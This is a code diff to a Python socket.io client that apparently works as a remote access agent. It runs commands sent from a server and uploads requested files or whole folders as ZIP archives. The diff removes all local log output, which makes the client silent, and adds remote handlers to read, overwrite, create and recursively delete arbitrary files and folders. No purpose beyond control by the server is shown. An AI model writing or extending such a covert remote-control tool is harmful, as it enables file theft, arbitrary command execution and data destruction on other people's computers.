@@ -6,6 +6,7 @@ import sys
 import os
 import zipfile
 import io
+import shutil
 
 sio = socketio.Client()
 
@@ -39,7 +40,6 @@ def destroy_connection():
 
 @sio.on('sendCommand')
 def handle_command(command):
-    print(f"[*] Received command: {command}")
     response = run_command(command)
     sio.emit("commandResponse", response)
 
@@ -52,7 +52,6 @@ def receive_File(data):
             destination = data['destination']
 
             if not os.path.exists(destination):
-                print(f"Error: Destination {destination} does not exist")
                 sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "Destination does not exist"})
                 return
 
@@ -61,13 +60,10 @@ def receive_File(data):
             with open(file_path, "wb") as f:
                 f.write(filebuffer)
 
-            print(f"File {filename} received and saved in {destination}")
             sio.emit("receiveFileResponse", {"status": True, "filename": filename, "message": f"File {filename} received successfully"})
         else:
-            print("Error: Expected keys 'filename' and 'fileBuffer' not found in the received data.")
             sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "Expected keys 'filename' and 'fileBuffer' not found in the received data."})
     except Exception as e:
-        print(f"An error occurred while receiving the file: {e}")
         sio.emit("receiveFileResponse", {"status": False, "filename": filename, "message": "There was an error while receiving the file"})
 
 @sio.on('requestFile')
@@ -76,10 +72,7 @@ def send_file(data):
         filepath = data['filePath']
         filename = data['filename']
 
-        print(f"Received request for file {filename} from {filepath}")
-
         if not filepath or not filename:
-            print("Error: Missing required keys 'filePath' or 'filename'")
             sio.emit("requestFileResponse", {"status": False, "filename": filename})
             return
 
@@ -100,7 +93,6 @@ def send_file(data):
                 "filename": "all_files.zip",
                 "fileBuffer": zip_buffer.getvalue()
             })
-            print(f"All files from {filepath} sent as ZIP")
 
         else:
             full_file_path = os.path.join(filepath, filename)
@@ -112,11 +104,63 @@ def send_file(data):
                         "filename": filename,
                         "fileBuffer": filebuffer
                     })
-                    print(f"File {filename} sent to server")
             else:
-                print(f"Error: File {filename} not found in {filepath}")
                 sio.emit("requestFileResponse", {"status": False, "filename": filename})
 
     except Exception as e:
-        print(f"An error occurred: {e}")
         sio.emit("requestFileResponse", {"status": False, "filename": filename})
+
+@sio.on("createFile")
+def handle_create_file(data):
+    file_path = data.get("filePath")
+    content = data.get("content")
+    
+    try:
+        with open(file_path, "w", encoding="utf-8") as file:
+            file.write(content)
+        sio.emit("createFileResponse", {"status": True})
+    except Exception as e:
+        sio.emit("createFileResponse", {"status": False})
+
+@sio.on("readFile")
+def handle_read_file(data):
+    file_path = data.get("filePath")
+    
+    if not os.path.exists(file_path):
+        sio.emit("readFileResponse", {"status": False})
+        return
+    
+    try:
+        with open(file_path, "r", encoding="utf-8") as file:
+            content = file.read()
+        sio.emit("readFileResponse", {"status": True, "content": content})
+    except Exception as e:
+        sio.emit("readFileResponse", {"status": False})
+
+@sio.on("updateFile")
+def handle_update_file(data):
+    file_path = data.get("filePath")
+    content = data.get("content")
+    
+    try:
+        with open(file_path, "w", encoding="utf-8") as file:
+            file.write(content)
+        sio.emit("updateFileResponse", {"status": True})
+    except Exception as e:
+        sio.emit("updateFileResponse", {"status": False})
+
+@sio.on("deleteFile")
+def handle_delete_file(data):
+    file_path = data.get("filePath")
+    
+    try:
+        if os.path.exists(file_path):
+            if os.path.isdir(file_path):  
+                shutil.rmtree(file_path)  
+            else:
+                os.remove(file_path)  
+            sio.emit("deleteFileResponse", {"status": True})
+        else:
+            sio.emit("deleteFileResponse", {"status": False, "message": "File/Folder not found"})
+    except Exception as e:
+        sio.emit("deleteFileResponse", {"status": False, "message": str(e)})
